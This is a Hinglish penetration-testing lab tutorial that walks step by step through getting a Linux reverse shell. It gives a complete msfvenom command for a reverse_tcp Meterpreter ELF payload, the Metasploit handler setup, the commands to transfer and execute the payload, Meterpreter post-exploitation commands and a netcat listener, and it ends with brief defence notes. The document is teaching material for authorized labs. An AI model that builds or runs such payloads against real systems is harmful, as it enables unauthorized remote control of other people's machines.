# 🛡️ Practical 2 – Linux Reverse Shell

Aaj hum ek **basic Linux reverse shell lab practical** dekhenge jisme:

✔ Linux payload generate karna
✔ File executable banana (`chmod +x`)
✔ Metasploit handler setup karna
✔ Reverse Meterpreter session establish karna

⚠️ Ye practical sirf **authorized lab environment (Kali + Linux VM)** ke liye hai.

---

# 1️⃣ Basic Concept 📌

## 📌 Reverse Shell Kya Hota Hai?

Reverse shell me:

👉 Target machine attacker machine ko connect karti hai.

Matlab:

* Attacker wait karta hai
* Target khud connection initiate karta hai

---

## 🧠 Flow Diagram

```text id="0xt5h2"
Attacker (Kali)  <------  Linux Target
   Listener           Reverse Connection
```

---

# 2️⃣ Lab Setup 🖥️

## 📌 Required Machines

✔ Kali Linux (Attacker)
✔ Ubuntu / Debian VM (Target)
✔ Same Network

---

# 3️⃣ Find Kali IP Address 🌐

## 📌 Check IP

```bash id="4gm2zc"
ip a
```

Example Output:

```text id="khikgc"
192.168.1.10
```

👉 Ye attacker IP hai
👉 Isko hum **LHOST** bolte hain.

---

# 4️⃣ Create Linux Payload 🧨

## 📌 Payload Generation (msfvenom)

```bash id="l4i2ln"
msfvenom -p linux/x86/meterpreter/reverse_tcp \
LHOST=192.168.1.10 \
LPORT=4444 \
-f elf > shell.elf
```

---

# 🧠 Command Breakdown

| Part                              | Meaning                           |
| --------------------------------- | --------------------------------- |
| msfvenom                          | Payload generator tool            |
| -p                                | Payload type                      |
| linux/x86/meterpreter/reverse_tcp | Linux reverse Meterpreter payload |
| LHOST                             | Kali attacker IP                  |
| LPORT                             | Listening port                    |
| -f elf                            | Linux executable format           |
| > shell.elf                       | Save output into file             |

---

# 📌 Output

✔ `shell.elf` file generate hoti hai
✔ Ye Linux executable payload hota hai

---

# 5️⃣ Start Metasploit Framework ⚙️

## 📌 Open Metasploit

```bash id="vcjn0x"
msfconsole
```

---

# 6️⃣ Configure Handler 🎯

## 📌 Use Multi Handler

```bash id="2fzv1h"
use exploit/multi/handler
```

---

## 📌 Set Payload

```bash id="lqvqk9"
set payload linux/x86/meterpreter/reverse_tcp
```

---

## 📌 Set Network Settings

```bash id="j8jtrr"
set LHOST 192.168.1.10
```

```bash id="5k7qmy"
set LPORT 4444
```

---

# 7️⃣ Start Listener ▶️

```bash id="j6l38j"
exploit
```

or

```bash id="i89av4"
run
```

---

## 📌 Status

✔ Metasploit ab reverse connection ka wait karega

---

# 8️⃣ Transfer Payload to Target 📂

## 📌 Methods

Payload ko Linux target machine me transfer kar sakte ho:

✔ USB
✔ Shared folder
✔ SCP
✔ Python HTTP server
✔ Manual copy

Example filename:

```text id="48z5y5"
shell.elf
```

---

# 9️⃣ Make File Executable 🔓

Linux me executable permission dena zaruri hota hai.

---

## ⚙️ Command

```bash id="kv8k8u"
chmod +x shell.elf
```

---

# 🧠 Meaning

| Part      | Meaning                   |
| --------- | ------------------------- |
| chmod     | Change file permissions   |
| +x        | Add executable permission |
| shell.elf | Payload file              |

---

# 🔟 Execute Payload ▶️

## 📌 Run File

```bash id="w0mtjf"
./shell.elf
```

---

# 🧠 Meaning

| Part      | Meaning                         |
| --------- | ------------------------------- |
| ./        | Run file from current directory |
| shell.elf | Payload executable              |

---

# 1️⃣1️⃣ Successful Connection 🔗

Agar sab sahi hua to Metasploit me output aayega:

```text id="n5a2qg"
Meterpreter session opened
```

---

# 1️⃣2️⃣ Basic Meterpreter Commands 🧠

## 📌 System Information

```bash id="75qqzw"
sysinfo
```

---

## 📌 Current User

```bash id="1r5tfx"
getuid
```

---

## 📌 Current Directory

```bash id="c7alj0"
pwd
```

---

## 📌 File Listing

```bash id="2m1vgn"
ls
```

---

## 📌 Open Linux Shell

```bash id="73qjvx"
shell
```

---

# 1️⃣3️⃣ Netcat Listener (Alternative) 📡

Agar simple TCP listener test karna ho:

```bash id="e9j0zw"
nc -lvp 4444
```

---

# 🧠 Breakdown

| Part    | Meaning     |
| ------- | ----------- |
| nc      | Netcat tool |
| -l      | Listen mode |
| -v      | Verbose     |
| -p 4444 | Port 4444   |

---

# 📌 Overall Attack Flow Summary 🔥

```text id="s6wxyh"
1. Find attacker IP
2. Generate Linux payload
3. Start Metasploit handler
4. Transfer payload to target
5. chmod +x shell.elf
6. Execute payload
7. Reverse connection established
8. Meterpreter session opened
```

---

# 🛡️ Security Perspective

## 📌 Why Modern Systems Detect This

✔ EDR tools
✔ Suspicious outbound connections
✔ Unknown ELF execution
✔ Network monitoring
✔ Behavioral detection

---

## 📌 Defense Methods

✔ Don’t execute unknown ELF files
✔ Restrict executable permissions
✔ Monitor reverse connections
✔ Use endpoint security tools
✔ Apply least privilege access

---

# 🎯 Interview Questions

✔ What is reverse TCP payload?
✔ Why `chmod +x` required in Linux?
✔ Difference between ELF and EXE?
✔ Why handler and payload must match?
✔ Meterpreter advantages?

---

# 🏁 Final Thought

Ye practical Linux exploitation ka foundational concept hai:

👉 Payload generation
👉 Executable permissions
👉 Reverse TCP communication
👉 Meterpreter session handling

Agar ye clear ho gaya →
Advanced Linux penetration testing aur post-exploitation concepts easy ho jate hain 🔥
